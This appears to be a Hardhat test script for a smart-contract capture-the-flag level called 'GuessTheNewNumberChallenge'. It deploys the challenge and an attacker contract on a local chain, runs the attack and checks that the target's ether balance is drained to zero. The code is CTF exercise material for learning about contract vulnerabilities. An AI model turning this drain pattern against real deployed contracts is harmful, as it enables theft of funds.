import { expect } from 'chai';
import { Contract } from 'ethers';
import { ethers, network } from 'hardhat';
const { utils, provider } = ethers;

describe('GuessTheNewNumberChallenge', () => {
  let target: Contract;

  before(async () => {
    const targetFactory = await ethers.getContractFactory('GuessTheNewNumberChallenge');
    target = await targetFactory.deploy({
      value: utils.parseEther('1'),
    });
    await target.deployed();
    console.log('Target deployed to:', target.address);
  });

  it('Exploit', async () => {
    const attackerFactory = await ethers.getContractFactory('GuessTheNewNumberChallengeAttacker');
    const attacker = await attackerFactory.deploy(target.address);
    await attacker.deployed();
    console.log('attacker deployed on', attacker.address);

    console.log('Attacking');
    const tx = await attacker.attack({
      value: utils.parseEther('1'),
    });
    await tx.wait();
  });

  after(async () => {
    expect(await provider.getBalance(target.address)).to.equal(0);
  });
});
